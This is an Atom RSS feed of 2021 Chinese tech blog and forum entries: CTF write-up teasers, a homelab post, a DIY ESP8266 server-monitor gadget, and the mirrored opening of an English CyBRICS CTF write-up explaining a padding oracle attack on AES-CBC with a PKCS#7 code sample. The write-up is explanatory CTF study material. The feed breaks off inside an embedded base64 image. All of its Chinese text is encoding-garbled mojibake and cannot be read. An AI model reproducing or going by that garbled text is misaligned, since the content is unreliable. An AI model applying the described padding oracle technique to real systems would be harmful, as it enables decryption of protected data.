<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <generator>NUAA</generator>
    <id>https://blogroll.a2os.club</id>
    <title>NUAARSS</title>
    <updated>2021-09-20T18:14:53+08:00</updated>
    <link href="https://blogroll.a2os.club"/>
    <author>
        <name>NUAARSS</name>
    </author>
    
    
    <entry>
        <id>https://miaotony.xyz/2021/08/15/CTF_2021DASCTF_July/</id>
        <title><![CDATA[CTF | 2021 DASCTF July X CBCTF 4th éƒ¨åˆ†WriteUp]]></title>
        <updated>2021-09-16T15:20:41+08:00</updated>
        <link href="https://miaotony.xyz/2021/08/15/CTF_2021DASCTF_July/"/>
        <content type="text/html" src="https://miaotony.xyz/2021/08/15/CTF_2021DASCTF_July/"><![CDATA[æ‘¸é±¼æ‰“äº†ä¸ªDASCTF Julyï¼Œä¸»è¦çœ‹äº†çœ‹Webå’ŒMiscé¢˜ç›®ï¼Œå¤§éƒ¨åˆ†æ˜¯ç»“æŸåè¾¹åšè¾¹å†™çš„ï¼Œå†™å¾—è¿˜æ˜¯æŒºè¯¦ç»†çš„å§ï¼Œå½“ç„¶ä¹Ÿå°‘ä¸äº†èµ°å¼¯è·¯çš„åœ°æ–¹ã€‚]]></content>
        <author>
            <name><![CDATA[MiaoTony]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.stdioa.com/2021/09/homelab-share/</id>
        <title><![CDATA[HomeLab ç©æ³•ç®€å•åˆ†äº«]]></title>
        <updated>2021-09-16T06:41:52+08:00</updated>
        <link href="https://blog.stdioa.com/2021/09/homelab-share/"/>
        <content type="text/html" src="https://blog.stdioa.com/2021/09/homelab-share/"><![CDATA[<p>å¤§å­¦æ¯•ä¸šä¹‹å‰ä¸€ä¸ªå†²åŠ¨ä¹°äº†å°å¼æœºï¼Œåˆä¸€ä¸ªå†²åŠ¨ä¹°äº†å° Linux ä¸»æœºã€‚åˆ°ç°åœ¨å®ƒå·²ç»è¿è¡Œäº†å››å¹´å¤šäº†ï¼Œç®€å•åˆ†äº«ä¸‹è‡ªå·±çš„ç©æ³•ã€‚</p>]]></content>
        <author>
            <name><![CDATA[Stdioâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.suruifu.com/posts/662</id>
        <title><![CDATA[â€œæ‡’æƒ°â€ï¼Œâ€œå •è½â€ä¸æ˜¯ä¸€ä¸ªduoï¼]]></title>
        <updated>2021-09-03T08:53:30+08:00</updated>
        <link href="https://www.suruifu.com/posts/662"/>
        <content type="text/html" src="https://www.suruifu.com/posts/662"><![CDATA[<h2>é€å­—åˆ†æ</h2>
<ul>
<li>â€œæƒ°â€
<ul>
<li>æ ‘å¿ƒæ—ã€‚å’Œå¿ƒã€å’Œå¿ƒæ€§ç›¸å…³</li>
<li>ç”¨æ¥æè¿°ä¸€ä¸ªäººçš„æ€§æ ¼ï¼Œä¸â€œå‹¤å¿«â€ç›¸å…³å¯¹åº”ï¼Œå¦‚â€œæ‡’æƒ°â€</li>
<li>ç”¨æ¥æè¿°ä¸€ä¸ªç‰©è´¨çš„å±æ€§ï¼Œä¸â€œæ´»è·ƒâ€ç›¸å¯¹åº”ï¼Œå¦‚â€œæƒ°æ€§æ°”ä½“â€</li>
</ul>
</li>
<li>â€œå •â€
<ul>
<li>ä¸‹é¢æœ‰ä¸€ä¸ªåœŸï¼Œè¡¨ç¤ºæ‰åœ¨åœ°ä¸Šçš„æ„æ€ã€‚</li>
<li>æ‰è½ã€ä¸‹è½ï¼Œè¡¨ç¤ºæ–¹å‘</li>
<li>å¦‚â€œå •è½â€ã€â€œå •èƒâ€</li>
</ul>
</li>
</ul>
<h2>è€¦åˆç‚¹</h2>
<ul>
<li>â€œæ‡’æƒ°â€ä¼šä½¿äººâ€œå •è½â€</li>
<li>â€œæ‡’æƒ°â€è¡¨ç¤ºæ€§æ ¼ï¼Œâ€œå •è½â€å¼ºè°ƒç»“æœ</li>
</ul>
<h2>æ€ä¹ˆå›äº‹å‘¢ï¼Ÿ</h2>
<p>å› ä¸ºæˆ‘ç»™å®¢æˆ·ï¼Œä¹Ÿæ˜¯æˆ‘çš„ä¸€ä¸ªè€å¸ˆå‘é€çš„åˆåŒé‡Œé¢å‡ºç°äº†ä¸€ä¸ªé”™åˆ«å­—ã€‚è€å¸ˆåŠæ—¶çº æ­£äº†æˆ‘çš„é”™è¯¯ã€‚<br />
<img src="https://s.suruifu.com/www/2021/09/WeCom-Screenshot_20210903165132.png" alt="" /></p>
<p>åæ¥ç»è¿‡æ£€ç´¢ï¼Œå‘ç°ç½‘ä¸Šä¹Ÿå­˜åœ¨è¿™æ ·çš„é”™è¯¯ã€‚</p>
<p><img src="https://s.suruifu.com/www/2021/09/WeCom-Screenshot_20210903165227.png" alt="" /></p>]]></content>
        <author>
            <name><![CDATA[è‹ç‘è¾…çš„ä¸ªäººç½‘ç«™]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://miaotony.xyz/2021/08/24/CTF_2021XiangYun/</id>
        <title><![CDATA[CTF | 2021 ç¥¥äº‘æ¯ Misc WriteUp]]></title>
        <updated>2021-08-31T15:31:58+08:00</updated>
        <link href="https://miaotony.xyz/2021/08/24/CTF_2021XiangYun/"/>
        <content type="text/html" src="https://miaotony.xyz/2021/08/24/CTF_2021XiangYun/"><![CDATA[åˆæ˜¯ä¸€ä¸ªæ‰“CTFçš„å‘¨æœ«ï¼Œè¿™å‘¨æ‰“äº†ä¸ªç¥¥äº‘æ¯ï¼Œå–µå–µä¸»è¦åœ¨çœ‹Miscé¢˜ç›®ï¼Œæ‘¸é±¼å¥½ç´¯ï¼Œåˆä¸èƒ½å‡ºå»ç©äº†ï¼Œå–µå‘œå‘œã€‚]]></content>
        <author>
            <name><![CDATA[MiaoTony]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.vvzero.com/2021/08/31/Topuino-the-wonderful-Knickknack-for-server-monitoring/</id>
        <title><![CDATA[Topuino - ä½ æ„¿æ„åœ¨åŠå…¬æ¡Œä¸Šæ”¾ä¸€ä¸ªç›‘æ§æœåŠ¡å™¨çš„å°æ‘†ä»¶å—ï¼Ÿ]]></title>
        <updated>2021-08-31T14:37:11+08:00</updated>
        <link href="https://blog.vvzero.com/2021/08/31/Topuino-the-wonderful-Knickknack-for-server-monitoring/"/>
        <content type="text/html" src="https://blog.vvzero.com/2021/08/31/Topuino-the-wonderful-Knickknack-for-server-monitoring/"><![CDATA[<blockquote><p>æˆ‘åšäº†ä¸€ä¸ªç”¨æ¥ç›‘æ§æœåŠ¡å™¨çš„æ¡Œé¢å°æ‘†ä»¶</p></blockquote><p><img src="https://img.vvzero.com/blog/Topuino-the-wonderful-Knickknack-for-server-monitoring/1.png"></p><h2 id="ä»€ä¹ˆæ˜¯-Topuino"><a href="#ä»€ä¹ˆæ˜¯-Topuino" class="headerlink" title="ä»€ä¹ˆæ˜¯ Topuino"></a>ä»€ä¹ˆæ˜¯ Topuino</h2><p>Topuino æ˜¯æˆ‘ DIY çš„ä¸€ä¸ªæ¡Œé¢å°æ‘†ä»¶ï¼Œå¯ä»¥å®ç°é€šç”¨æœåŠ¡å™¨æˆ–è®¡ç®—æœºçš„æ•°æ®ç›‘æ§ï¼ŒåŒ…æ‹¬ CPU å ç”¨ã€RAM å ç”¨ã€ä¸¤ä¸ªç¡¬ç›˜çš„å¯ç”¨ç©ºé—´ã€ç¡¬ç›˜è¯»å†™é€Ÿåº¦ã€ç½‘ç»œ IO é€Ÿç‡ã€‚</p><h2 id="ä¸ºä»€ä¹ˆå«-Topuino"><a href="#ä¸ºä»€ä¹ˆå«-Topuino" class="headerlink" title="ä¸ºä»€ä¹ˆå« Topuino"></a>ä¸ºä»€ä¹ˆå« Topuino</h2><p>åœ¨ Linux ç³»åˆ—æœåŠ¡å™¨ä¸Šï¼Œæˆ‘ä»¬é€šå¸¸ä½¿ç”¨ top å‘½ä»¤æŸ¥çœ‹ CPU å†…å­˜å ç”¨ï¼Œæˆ‘æœ€åˆçš„è®¾æƒ³ä¹Ÿæ˜¯å°† top å‘½ä»¤å®ç‰©åŒ–ï¼Œè¿™å°±æ˜¯ Topuino ä¸­ Top çš„ç”±æ¥ã€‚</p><p>åœ¨é€‰å‹çš„æ—¶å€™ï¼Œä¸ºäº†å…¼é¡¾å¼€å‘æ•ˆç‡å’Œæˆæœ¬ï¼Œæˆ‘é€‰ç”¨äº†å¤§åé¼é¼çš„ ESP8266 å•ç‰‡æœºï¼Œé…åˆäº† Arduino å¼€å‘æ¡†æ¶ï¼ŒArduino åˆ™æ˜¯ Topuino ä¸­ uino çš„ç”±æ¥ã€‚</p><h2 id="Topuino-æœ‰å“ªäº›äº®ç‚¹"><a href="#Topuino-æœ‰å“ªäº›äº®ç‚¹" class="headerlink" title="Topuino æœ‰å“ªäº›äº®ç‚¹"></a>Topuino æœ‰å“ªäº›äº®ç‚¹</h2><p>å…ˆçœ‹å›¾è§£ï¼š</p><p><img src="https://img.vvzero.com/blog/Topuino-the-wonderful-Knickknack-for-server-monitoring/2.png"></p><ol><li>æˆ‘è§‰å¾—å®ƒæŒºå¥½çœ‹ï¼Œå“‘å…‰é»‘çš„ PCB åº•æ¿å¯Œæœ‰ç§‘æŠ€æ„Ÿï¼Œçº¢ç»¿è“ä¸‰è‰² LED å±‚æ¬¡åˆ†æ˜ï¼ŒæŒ‡ç¤ºæ€§å¼ºï¼›</li><li>æ˜¾ç¤ºçš„å‚æ•°æ»¡è¶³å¤§éƒ¨åˆ†çš„éœ€æ±‚ï¼Œåˆ·æ–°ç‡ä¸º 1 ç§’ï¼ŒCPUã€å†…å­˜ã€ç£ç›˜å ç”¨ä»¥ç™¾åˆ†æ¯”è¡¨ç¤ºåœ¨æŸ±çŠ¶å›¾ä¸Šï¼Œç£ç›˜ã€ç½‘ç»œ IO å„ä»¥å››ä½æ•°ç ç®¡æ˜¾ç¤ºï¼Œé…åˆ KBã€MB å•ä½æ˜¾ç¤ºï¼Œå¯ä»¥è¡¨ç¤º 0KB - 9999MB /s çš„é€Ÿç‡ï¼›</li><li>é…ç½®ã€æ“ä½œæ–¹ä¾¿ã€‚åœ¨éœ€è¦ç›‘æ§çš„æœåŠ¡å™¨ä¸Šåªéœ€è¦è·‘ä¸€ä¸ª python è„šæœ¬å³å¯ï¼›Topuino é¦–æ¬¡ä¸Šç”µåæ”¯æŒç”¨æ‰‹æœºæˆ–ä»»ä½•æ”¯æŒ Wi-Fi çš„è®¾å¤‡è¿æ¥ï¼Œå¹¶é€šè¿‡æµè§ˆå™¨é…ç½®ã€‚è‹¥éœ€è¦é‡æ–°é…ç½®ï¼Œé€šè¿‡æŒ‰é”®å³å¯æ¢å¤ï¼›</li><li>ä½¿ç”¨äº†é€šç”¨çš„ USB-TypeC æ¥å£ï¼ˆåæœŸä¼šåšå¸¦ç”µæ± ç‰ˆæœ¬ï¼‰ï¼›</li><li>æˆæœ¬ä¸é«˜ï¼Œè°éƒ½å¯ä»¥æ‰¿æ‹…ã€‚</li></ol><p><img src="https://img.vvzero.com/blog/Topuino-the-wonderful-Knickknack-for-server-monitoring/3.jpg"></p><h2 id="Topuino-çš„å·¥ä½œåŸç†"><a href="#Topuino-çš„å·¥ä½œåŸç†" class="headerlink" title="Topuino çš„å·¥ä½œåŸç†"></a>Topuino çš„å·¥ä½œåŸç†</h2><ul><li>æœåŠ¡å™¨éƒ¨åˆ†å¾ˆç®€å•ï¼Œä¸»ç«™ä½¿ç”¨äº† Flaskï¼Œç»´æŠ¤ä¸€ä¸ªæ•°æ®åº“ï¼Œä¿å­˜ç€ä»ç«™ï¼ˆè¢«ç›‘æ§æœåŠ¡å™¨ï¼‰UUID ä¸è¿è¡Œå‚æ•°çš„æ˜ å°„å…³ç³»ï¼ˆå®é™…ä¸Šç°åœ¨æ˜¯ç”¨ python çš„å­—å…¸ç®€å•å®ç°çš„ï¼‰ã€‚ä¸»ç«™æ¥æ”¶ä»ç«™çš„è¿è¡Œæ•°æ®ï¼Œå¹¶å‘ Topuino å›ä¼ æ•°æ®ï¼›</li><li>æœåŠ¡å™¨ä»ç«™é‡‡ç”¨ python çš„ psutil åº“ï¼Œè·å–æ‰€æœ‰çš„è¿è¡Œæ•°æ®ï¼›</li><li>Topuino ç¡¬ä»¶éƒ¨åˆ†ä½¿ç”¨äº† ESP-12F ä½œä¸º MCUï¼Œæ˜¾ç¤ºé‡‡ç”¨ LED æ•´åˆ—å’Œæ•°ç ç®¡ï¼Œæ˜¾ç¤ºé©±åŠ¨æ˜¯ TM1638 èŠ¯ç‰‡ã€‚</li></ul><p>é™„ä¸ŠåŸç†å›¾ï¼š</p><p><img src="https://img.vvzero.com/blog/Topuino-the-wonderful-Knickknack-for-server-monitoring/4.png"></p><p><img src="https://img.vvzero.com/blog/Topuino-the-wonderful-Knickknack-for-server-monitoring/5.png"></p><p><img src="https://img.vvzero.com/blog/Topuino-the-wonderful-Knickknack-for-server-monitoring/6.png"></p><p>PCB æ‰“æ ·äº¤ç»™ä¸“é—¨çš„å‚å®¶ï¼Œå›æ¥è‡ªå·±ç„Šã€‚</p><h2 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h2><p>ä½ æ„¿æ„åœ¨åŠå…¬æ¡Œä¸Šæ”¾ä¸€ä¸ªç›‘æ§æœåŠ¡å™¨çš„å°æ‘†ä»¶å—ï¼Ÿè‡³å°‘ï¼Œæˆ‘åšå‡ºæ¥ä¹‹åï¼Œå¾ˆå–œæ¬¢ï¼Œå°±åƒçœ‹ç€ä¸€åªçŒ«ä¸€æ ·ã€‚</p><p><img src="https://img.vvzero.com/blog/Topuino-the-wonderful-Knickknack-for-server-monitoring/7.png"></p><p>å¦ï¼šESP8266 çš„ä»£ç åˆæ­¥å¼€æºåœ¨ <a href="https://github.com/Villivateur/Topuino">https://github.com/Villivateur/Topuino</a> ï¼Œä¾›å¤§å®¶å‚è€ƒã€‚æœåŠ¡å™¨ç«¯ä»£ç å› ä¸ºå¤ªç®€å•ä¸”å†™å¾—å¤ªä¸‘ï¼Œä»¥åå†è¯´å§~~</p>]]></content>
        <author>
            <name><![CDATA[VVBLOG]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://miaotony.xyz/2021/08/10/CTF_2021DASCTF_July_cybercms/</id>
        <title><![CDATA[CTF | 2021 DASCTF July cybercms ä¸€æ¢å†æ¢]]></title>
        <updated>2021-08-28T20:34:53+08:00</updated>
        <link href="https://miaotony.xyz/2021/08/10/CTF_2021DASCTF_July_cybercms/"/>
        <content type="text/html" src="https://miaotony.xyz/2021/08/10/CTF_2021DASCTF_July_cybercms/"><![CDATA[åœ¨å‰ä¸ä¹…ç»“æŸçš„DASCTF Julyä¸­ï¼Œæœ‰ä¸€é“åä¸ºcybercmsçš„webé¢˜ç›®ï¼Œå½“æ—¶æ‰“äº†åŠå¤©æ²¡æ‰“é€šï¼Œèµ›åè¿˜æ˜¯æƒ³ä¸é€šå°±æ¥ç¨å¾®æ·±å…¥æ¢ç©¶äº†ä¸€ä¸‹ã€‚]]></content>
        <author>
            <name><![CDATA[MiaoTony]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://bbs.a2os.club/d/19-/1</id>
        <title><![CDATA[é•¿æ—¶é—´æœªç™»å½•ç”¨æˆ·ä¼šè¢«æ¸…ç†è´¦å·å—ï¼Ÿ]]></title>
        <updated>2021-08-20T06:37:53+08:00</updated>
        <link href="https://bbs.a2os.club/d/19-/1"/>
        <content type="text/html" src="https://bbs.a2os.club/d/19-/1"><![CDATA[<p>æˆ‘å°è±¡ä¸­å¾ˆæ—©å‰æ³¨å†Œè¿‡è®ºå›è´¦å·ï¼Œåœ¨é‚®ç®±é‡Œä¹Ÿç¿»åˆ°20å¹´4æœˆé‡ç½®å¯†ç çš„é‚®ä»¶ï¼Œç»“æœç°åœ¨è´¦å·ä¸å­˜åœ¨äº†ï¼ŒåŒæ ·çš„é‚®ç®±åˆé‡æ–°æ³¨å†Œäº†ä¸€ä¸ªã€‚<br>
æ˜¯ä¼šè‡ªåŠ¨æ¸…ç†æœªç™»å½•ç”¨æˆ·ï¼Œè¿˜æ˜¯è®ºå›é‡å¼€äº†ä¸€æ¬¡ï¼Ÿ</p>]]></content>
        <author>
            <name><![CDATA[A2OS å¼€æºç¤¾åŒºè®ºå›]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://bbs.a2os.club/d/18-/1</id>
        <title><![CDATA[æ¶…æ§ƒä¹‹ååˆå˜æˆæ—¶ä»£çš„çœ¼æ³ªäº†å—ï¼Ÿ]]></title>
        <updated>2021-08-20T03:09:40+08:00</updated>
        <link href="https://bbs.a2os.club/d/18-/1"/>
        <content type="text/html" src="https://bbs.a2os.club/d/18-/1"><![CDATA[<p>ä¸çŸ¥é“æˆ‘è¿™ä¸ªIDæœ‰æ²¡æœ‰è§‰å¾—çœ¼ç†Ÿï¼Ÿ<br>
çœ‹åˆ°è¿™ä¸ªè®ºå›æœ€æ–°çš„å¸–å­éƒ½æ˜¯4æœˆä»½çš„å°±å¾ˆæœ‰æ„Ÿè§¦<br>
æœ€å¥½ä¸è¦è®©lcjçŸ¥é“è¿™ä¸ªåœ°æ–¹<br>
ä¸ç„¶ä»–ä¼šå± ç‰ˆçš„<br>
ğŸ˜…</p>]]></content>
        <author>
            <name><![CDATA[A2OS å¼€æºç¤¾åŒºè®ºå›]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.zeddyu.info/2021/08/02/cybrics-checkin-2021/</id>
        <title><![CDATA[Writeup for Web-Checkin in CyBRICS CTF 2021 (Mirror)]]></title>
        <updated>2021-08-12T09:17:22+08:00</updated>
        <link href="https://blog.zeddyu.info/2021/08/02/cybrics-checkin-2021/"/>
        <content type="text/html" src="https://blog.zeddyu.info/2021/08/02/cybrics-checkin-2021/"><![CDATA[<html><head></head><body><p>This is the fork of my friendâ€™s blog: <a href="https://blog.soreatu.com/posts/writeup-for-web-checkin-in-cybrics-ctf-2021/" target="_blank" rel="noopener">https://blog.soreatu.com/posts/writeup-for-web-checkin-in-cybrics-ctf-2021/</a>. We have worked together for two days to solve the hardest web CheckIn in the CybricsCTF 2021. It is nearly a crypto challenge but I think it deserves a writeup.</p><a id="more"></a><p>[toc]</p><h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><p>Padding Oracle Attack + Bit Flip Attack + XSS</p><p>This is a hard web challenge in <a href="https://cybrics.net/tasks" target="_blank" rel="noopener">CyBRICS CTF 2021</a>. For some reason, the challenge was ZERO solved during the competition. The author fixed some bug after the competition and announced that anyone who can solve it would receive a reward. We managed to solve it and was one of the only two teams that  claimed the reward.</p><h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><p>This challenge simulates a flight booking site, where we can search for flight tickets, buy tickets, and upload tickets to be registered.</p><p>By submitting a form on <a href="http://207.154.224.121:8080/finalize?fisrtName=xxx&amp;lastName=xxx" target="_blank" rel="noopener">http://207.154.224.121:8080/finalize?fisrtName=xxx&amp;lastName=xxx</a>, we will receive a aztec code, which embeds a piece of base64-encoded data.</p><p>We can upload the aztec code through <a href="http://207.154.224.121:8080/upload" target="_blank" rel="noopener">http://207.154.224.121:8080/upload</a>, and get a successful â€œ<em>you are now registered</em>â€œ response (but thisâ€™s not what we want).</p><p>Later, we found something interesting after changing some byte of the base64-encoded data. We got a *â€PADDING_ERRORâ€* response by modifying some byte of the data. It immediately occurred to us that this might well be an instance of <strong>padding oracle attack</strong>.</p><p>To confirm the intuition we just developed, we generated a aztec code, base64 decoded it into ciphertext, XORed every 256 possible byte value (0~256) in the last byte of the second last ciphertext block, base64 encoded back to a aztec code (utilizing python <code>aztec_code_generator</code> module), and uploaded the aztec code to the server. We received 256 responses, 255 of whose <em>status code</em> is 200, with only one response whose <em>status code</em> is 500. Among the 255 responses, XORing by <code>b"\x00"</code>  in the last byte got a â€œ<em>Success</em>â€œ reponse and the remaining 254 are all â€œPADDING_ERRORâ€ responses. This implied that only the â€œ<em>Success</em>â€œ response one and the 500 <em>status code</em> one got correctly padded plaintext after decryption on the server side. The â€œ<em>Success</em>â€œ response was due to itâ€™s the original unmodified padded plaintext, while the 500 <em>status code</em> one was because the plaintext after decryption was somewhat modified to be correctly padded and we can gain knowledge of the last byte of the original plaintext by making use of this. </p><p>By continously sending carefully modified ciphertext to the server and then distinguishing whether or not the server responses with â€œ<em>PADDING_ERROR</em>â€œ, we can recover the whole plaintext byte by byte. This is the so-called <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack" target="_blank" rel="noopener">padding oracle attack</a>.</p><h2 id="Padding-Oracle-Attack"><a href="#Padding-Oracle-Attack" class="headerlink" title="Padding Oracle Attack"></a>Padding Oracle Attack</h2><p>So, how does the padding oracle attack work?</p><hr><p>First, we need to understand <strong>what is padding</strong>. </p><p>It is known that block ciphers can transform (encrypt/decrypt) a plaintext/ciphertext block. 16 bytes data in the case of AES, into a ciphertext/plaintext block. Using some block cipher mode of operation, we can repeatedly apply the block cipher encrypting/decrypting operation on amouts of data whose length is more than a block. For example, AES-CBC mode can encrypt/decrypt multiple blocks. But what if the length of data is not a multiple of the block length?  The answer is to use some kind of padding methods, which append some data at the end of the last block to make it a full block.</p><p>One of the most widely used padding method is <a href="https://en.wikipedia.org/wiki/Padding_(cryptography)#PKCS#5_and_PKCS#7" target="_blank" rel="noopener">PKCS#7</a> padding method. PKCS#7 first calculates the number of bytes ( <code>pad_length</code>) to be padded, and then appends to the last plaintext block <code>pad_length</code>  bytes, with each byte value being <code>pad_length</code>.  Upon unpadding, the last byte of the decryption result is extracted and parsed as the <code>pad_length</code>, after which <code>pad_length</code> long bytes are truncated at the end. Below is a Python implementation of PKCS#7 padding and unpadding.</p><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pad</span><span class="hljs-params">(pt)</span>:</span></span><br><span class="line">    pad_length = <span class="hljs-number">16</span> - len(pt)%<span class="hljs-number">16</span></span><br><span class="line">    pt += bytes([pad_length]) * pad_length</span><br><span class="line">    <span class="hljs-keyword">return</span> pt</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">unpad</span><span class="hljs-params">(pt)</span>:</span></span><br><span class="line">    pad_length = pt[<span class="hljs-number">-1</span>]</span><br><span class="line">    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-number">1</span> &lt;= pad_length &lt;= <span class="hljs-number">16</span>:</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span></span><br><span class="line">    <span class="hljs-keyword">if</span> pad(pt[:-pad_length]) != pt:</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span></span><br><span class="line">    <span class="hljs-keyword">return</span> pt[:-pad_length]</span><br></pre></td></tr></tbody></table></figure><p></p><p>Note that a valid padding check is done after unpadding. This means that only the following 16 formats of the last block is considered as valid. All the other formats of data are invalid and will produce a <em>PADDING_ERROR</em> response, which is a padding oracle that we will exploit later. </p><blockquote><p>Another point to be noted is that, even if the length of plaintext is a multiple of the block size, padding is still needed. In this case, 0x10 bytes will be appended, with each byte value being <code>\x10</code>. </p></blockquote><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/image-20210729103443272.png" alt="image-20210729103443272" title="valid padded plaintext"></p><hr><p>Before moving on, we also need to be fimilar with <strong>AES-CBC</strong>, which is the most common mode that padding oracle attack can be mounted on.</p><p>In CBC mode, plaintext is padded and divided into several plaintext blocks. Each plaintext block is XORed with the previous ciphertext block before being AES encrypted. The first plaintext block is XORed with a randomly generated initializaiton vector (IV). The final encryption result is the concatenation of the ciphertext blocks with IV at the head. Decryption just reverses these operations.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKi